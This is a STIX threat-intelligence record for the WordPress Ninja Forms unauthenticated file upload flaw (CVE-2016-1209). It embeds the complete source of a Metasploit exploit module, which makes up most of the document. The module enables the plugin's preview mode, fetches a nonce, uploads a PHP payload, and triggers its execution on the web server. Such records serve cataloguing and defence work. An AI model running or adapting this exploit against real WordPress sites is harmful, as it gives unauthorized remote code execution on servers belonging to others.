{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--22f5a162-6ad9-4af6-ae07-38403b6e2f38",
    "created": "2024-08-14T17:11:08.256016Z",
    "modified": "2024-08-14T17:11:08.25602Z",
    "name": "WordPress Ninja Forms Unauthenticated File Upload",
    "description": "( Versions 2.9.36 to 2.9.42 of the Ninja Forms plugin contain an unauthenticated file upload vulnerability, allowing guests to upload arbitrary PHP code that can be executed in the context of the web server. ) 'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wp_ninja_forms_unauthenticated_file_upload.rb",
            "external_id": "wp_ninja_forms_unauthenticated_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-1209"
        },
        {
            "source_name": "WPVDB",
            "external_id": "8485"
        },
        {
            "source_name": "reference",
            "url": "http://www.pritect.net/blog/ninja-forms-2-9-42-critical-security-vulnerabilities"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'WordPress Ninja Forms Unauthenticated File Upload',\n      'Description'     => %(\n        Versions 2.9.36 to 2.9.42 of the Ninja Forms plugin contain\n        an unauthenticated file upload vulnerability, allowing guests\n        to upload arbitrary PHP code that can be executed in the context\n        of the web server.\n      ),\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'James Golovich', # Discovery and disclosure\n          'rastating'       # Metasploit module\n        ],\n      'References'      =>\n        [\n          ['CVE', '2016-1209'],\n          ['WPVDB', '8485'],\n          ['URL', 'http://www.pritect.net/blog/ninja-forms-2-9-42-critical-security-vulnerabilities']\n        ],\n      'DisclosureDate'  => '2016-05-04',\n      'Platform'        => 'php',\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [['ninja-forms', {}]],\n      'DefaultTarget'   => 0\n    ))\n\n    opts = [OptString.new('FORM_PATH', [true, 'The relative path of the page that hosts any form served by Ninja Forms'])]\n    register_options(opts, self.class)\n  end\n\n  def print_status(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_good(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_error(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def check\n    check_plugin_version_from_readme('ninja-forms', '2.9.43', '2.9.36')\n  end\n\n  def enable_v3_functionality\n    print_status 'Enabling vulnerable V3 functionality...'\n    res = send_request_cgi(\n      'method'    => 'GET',\n      'uri'       => target_uri.path,\n      'vars_get'  => { 'nf-switcher' => 'upgrade' }\n    )\n\n    unless res && res.code == 200\n      if res\n        fail_with(Failure::Unreachable, \"Failed to enable the vulnerable V3 functionality. Server returned: #{res.code}, should be 200.\")\n      else\n        fail_with(Failure::Unreachable, 'Connection timed out.')\n      end\n    end\n\n    vprint_good 'Enabled V3 functionality'\n  end\n\n  def disable_v3_functionality\n    print_status 'Disabling vulnerable V3 functionality...'\n    res = send_request_cgi(\n      'method'    => 'GET',\n      'uri'       => target_uri.path,\n      'vars_get'  => { 'nf-switcher' => 'rollback' }\n    )\n\n    if res && res.code == 200\n      vprint_good 'Disabled V3 functionality'\n    elsif !res\n      print_error('Connection timed out while disabling V3 functionality')\n    else\n      print_error 'Failed to disable the vulnerable V3 functionality'\n    end\n  end\n\n  def generate_mime_message(payload_name, nonce)\n    data = Rex::MIME::Message.new\n    data.add_part('nf_async_upload', nil, nil, 'form-data; name=\"action\"')\n    data.add_part(nonce, nil, nil, 'form-data; name=\"security\"')\n    data.add_part(payload.encoded, 'application/x-php', nil, \"form-data; name=\\\"#{Rex::Text.rand_text_alpha(10)}\\\"; filename=\\\"#{payload_name}\\\"\")\n    data\n  end\n\n  def fetch_ninja_form_nonce\n    uri = normalize_uri(target_uri.path, datastore['FORM_PATH'])\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => uri\n    )\n\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, \"Unable to access FORM_PATH: #{datastore['FORM_PATH']}\")\n    end\n\n    form_wpnonce = res.get_hidden_inputs.first\n    form_wpnonce = form_wpnonce['_wpnonce'] if form_wpnonce\n\n    nonce = res.body[/var nfFrontEnd = \\{\"ajaxNonce\":\"([a-zA-Z0-9]+)\"/i, 1] || form_wpnonce\n\n    unless nonce\n      fail_with(Failure::Unknown, 'Cannot find wpnonce or ajaxNonce from FORM_PATH')\n    end\n\n    nonce\n  end\n\n  def upload_payload(data)\n    res = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => wordpress_url_admin_ajax,\n      'ctype'   => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'    => data.to_s\n    )\n\n    fail_with(Failure::Unreachable, 'No response from the target') if res.nil?\n    vprint_error(\"Server responded with status code #{res.code}\") if res.code != 200\n  end\n\n  def execute_payload(payload_name, payload_url)\n    register_files_for_cleanup(\"nftmp-#{payload_name.downcase}\")\n    res = send_request_cgi({ 'uri' => payload_url, 'method' => 'GET' }, 5)\n\n    if !res.nil? && res.code == 404\n      print_error(\"Failed to upload the payload\")\n    else\n      print_good(\"Executed payload\")\n    end\n  end\n\n  def exploit\n    # Vulnerable code is only available in the version 3 preview mode, which can be\n    # enabled by unauthenticated users due to lack of user level validation.\n    enable_v3_functionality\n\n    # Once the V3 preview mode is enabled, we can acquire a nonce by requesting any\n    # page that contains a form generated by Ninja Forms.\n    nonce = fetch_ninja_form_nonce\n\n    print_status(\"Preparing payload...\")\n    payload_name = \"#{Rex::Text.rand_text_alpha(10)}.php\"\n    payload_url = normalize_uri(wordpress_url_wp_content, 'uploads', \"nftmp-#{payload_name.downcase}\")\n    data = generate_mime_message(payload_name, nonce)\n\n    print_status(\"Uploading payload to #{payload_url}\")\n    upload_payload(data)\n\n    print_status(\"Executing the payload...\")\n    execute_payload(payload_name, payload_url)\n\n    # Once the payload has been executed, we can disable the preview functionality again.\n    disable_v3_functionality\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-05-04",
    "x_mitre_platforms": [
        "php'"
    ]
}